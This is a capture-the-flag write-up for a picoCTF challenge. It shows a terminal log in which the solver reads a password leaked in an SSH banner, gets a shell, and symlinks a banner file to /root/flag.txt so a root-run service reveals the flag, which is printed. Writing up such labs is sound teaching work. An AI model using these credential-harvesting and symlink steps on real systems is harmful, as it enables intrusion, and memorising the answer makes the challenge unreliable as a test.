## Descripción:
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 60490`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 65395`. From the above information abuse the machine and find the flag in the /root directory.

Hints:
- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solución:
```
artacas-picoctf@webshell:~$ nc tethys.picoctf.net 60490
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.

artacas-picoctf@webshell:~$ nc tethys.picoctf.net 65395
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Driper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEF CON     
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ cd /home/player
rm banner
ln -s /root/flag.txt banner
cd /home/player
player@challenge:~$ rm banner
ln -s /root/flag.txt banner
player@challenge:~$ ln -s /root/flag.txt banner
player@challenge:~$ ls     
ls
banner  text
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ^C 
artacas-picoctf@webshell:~$ nc tethys.picoctf.net 65395
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```
